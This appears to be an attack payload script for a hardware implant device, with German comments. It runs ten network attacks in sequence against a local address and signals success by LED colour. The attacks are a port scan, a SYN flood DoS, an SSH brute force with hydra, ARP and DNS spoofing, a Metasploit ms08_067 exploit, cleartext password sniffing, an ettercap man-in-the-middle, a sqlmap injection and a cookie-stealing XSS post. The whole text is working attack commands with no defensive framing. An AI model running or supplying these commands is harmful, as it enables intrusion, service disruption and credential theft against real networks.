LED BLUE

# Angriff 1: Port-Scanning
nmap -sS -T4 192.168.1.1
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

# Angriff 2: DoS-Angriff
hping3 -S -P -U --flood -V -p 80 192.168.1.1
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

# Angriff 3: Brute-Force-Angriff
hydra -l admin -P /root/wordlist.txt -f 192.168.1.1 ssh
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

# Angriff 4: ARP-Spoofing
arpspoof -i eth0 -t 192.168.1.1 192.168.1.254
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

# Angriff 5: Exploit
msfconsole -q -x "use exploit/windows/smb/ms08_067_netapi; set RHOST 192.168.1.1; run"
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

# Angriff 6: DNS-Spoofing
dnsspoof -i eth0 -f /root/hosts 192.168.1.1
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

# Angriff 7: Passwort-Sniffing
tcpdump -i eth0 -A -s 0 'tcp port 80' | grep -i password
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

# Angriff 8: Man-in-the-Middle-Angriff
ettercap -T -q -i eth0 -M arp:remote /192.168.1.1/ /192.168.1.254/
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

# Angriff 9: SQL-Injection
sqlmap -u "http://192.168.1.1/login.php" --data "username=admin&password=password" --level=5 --risk=3
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

# Angriff 10: Cross-Site-Scripting-Angriff
wget --post-data='name=<script>alert(document.cookie)</script>&comment=test' http://192.168.1.1/comment.php
if [ $? -eq 0 ]; then
    LED GREEN
else
    LED RED
fi

LED BLUE

